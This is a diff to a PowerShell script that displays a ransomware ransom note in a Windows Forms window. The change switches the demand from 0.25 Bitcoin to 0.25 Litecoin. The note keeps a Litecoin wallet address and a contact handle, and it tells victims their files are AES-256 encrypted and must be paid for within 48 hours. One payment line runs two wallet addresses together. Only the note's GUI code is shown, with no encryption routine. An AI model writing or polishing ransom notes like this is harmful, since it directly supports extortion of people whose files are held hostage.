@@ -89,7 +89,7 @@ $label2.Font = New-Object Drawing.Font("Arial", 10)
 $form.Controls.Add($label2)
 
 $label3 = New-Object Windows.Forms.Label
-$label3.Text = "Send 0.25 BTC to: bc1qwjgqnucwvtsmqs8gxdd28jmyvu7nyztrxqadsx or ltc: LXoSTzJuA5UymfRWgmAWvpNT96KFfTwGxv"
+$label3.Text = "Send 0.25 LTC TO: LXoSTzJuA5UymfRWgmAWvpNT96KFfTwGxv"
 $label3.AutoSize = $true
 $label3.Location = New-Object Drawing.Size(20, 90)
 $label3.Font = New-Object Drawing.Font("Arial", 10, [Drawing.FontStyle]::Bold)
@@ -97,7 +97,7 @@ $form.Controls.Add($label3)
 
 $textbox = New-Object Windows.Forms.TextBox
 $textbox.Multiline = $true
-$textbox.Text = "All your documents, images, videos, and archives have been encrypted with AES-256.`n`nTo recover your files, you must pay 0.25 BTC within 48 hours.`n`nContact: kodaxd1`nPayment address: bc1qwjgqnucwvtsmqs8gxdd28jmyvu7nyztrxqadsx or ltc: LXoSTzJuA5UymfRWgmAWvpNT96KFfTwGxvbc1qwjgqnucwvtsmqs8gxdd28jmyvu7nyztrxqadsx`n`nDO NOT attempt to decrypt files yourself - you will lose them permanently."
+$textbox.Text = "All your documents, images, videos, and archives have been encrypted with AES-256.`n`nTo recover your files, you must pay 0.25 LTC within 48 hours.`n`nContact: kodaxd1`nPayment address: ltc: LXoSTzJuA5UymfRWgmAWvpNT96KFfTwGxvbc1qwjgqnucwvtsmqs8gxdd28jmyvu7nyztrxqadsx`n`nDO NOT attempt to decrypt files yourself - you will lose them permanently."
 $textbox.Size = New-Object Drawing.Size(650, 180)
 $textbox.Location = New-Object Drawing.Size(20, 120)
 $textbox.ReadOnly = $true
